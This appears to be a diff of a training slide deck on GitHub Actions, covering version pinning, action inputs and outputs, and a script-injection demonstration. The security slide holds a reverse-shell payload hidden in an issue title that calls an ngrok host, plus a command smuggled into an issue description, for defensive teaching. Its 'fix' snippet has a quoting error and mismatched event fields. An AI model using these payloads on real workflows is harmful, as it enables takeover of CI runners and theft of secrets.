@@ -24,20 +24,24 @@ steps:
   # Reference a specific commit
   - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675
     
-  # Reference the major version of a release
-  - uses: actions/checkout@v3
-    
   # Reference a specific version
   - uses: actions/checkout@v3.2.0
+    
+  # Reference the major version of a release
+  - uses: actions/checkout@v3
     
   # Reference a branch
   - uses: actions/checkout@main
 ```
 
-<br> 
-<br> 
+##==##
+<!-- .slide: class="with-code" -->
 
-## Using actions with parameters
+# Use a GitHub Action from the marketplace
+
+
+### Inputs
+
 ```yaml
 - name: Inject slug/short variables
   uses: rlespinasse/github-slug-action@v4
@@ -46,9 +50,26 @@ steps:
     prefix: CI_
 ```
 
+### Outputs
+
+```yaml
+- name : setup node
+  id: my-id
+  uses: actions/setup-node@v3
+  with:
+    node-version: '14'
+- name: run test
+  shell: bash
+  run: |
+    echo ${{ steps.my-id.outputs.node-version }}
+```
+
 Notes:
 
 Gaetan
+
+Reference in docker hub
+from local folder (.github/action)
 
 ##==##
 <!-- .slide: -->
@@ -98,14 +119,25 @@ Thibauld
 * Step of our GitHub Actions
 
 ```yaml
-      - run: |
-         echo "ISSUE TITLE: ${{github.event.issue.title}}"
-         echo "ISSUE DESCRIPTION: ${{github.event.issue.body}}"
+- run: |
+    echo "ISSUE TITLE: ${{github.event.issue.title}}"
+    ISSUE_DESCRIPTION="${{github.event.issue.body}}"
 ```
 
 * Simple issue name that trigger our Action
+
+  * Titlle : ```New title" && bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1 && echo "```
+  * Description : `a"; ls $GITHUB_WORKSPACE"`
+
+* Let's fix it :
+
 ```yaml
-New malicious issue title" && bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1 && echo "
+- env:
+    TITLE: ${{ github.event.pull_request.title }}
+    DESCRIPTION: ${{github.event.issue.body}}
+  run: |
+    echo "ISSUE TITLE: "$TITLE"
+    echo "ISSUE DESCRIPTION: $DESCRIPTION"
 ```
 
 Notes:
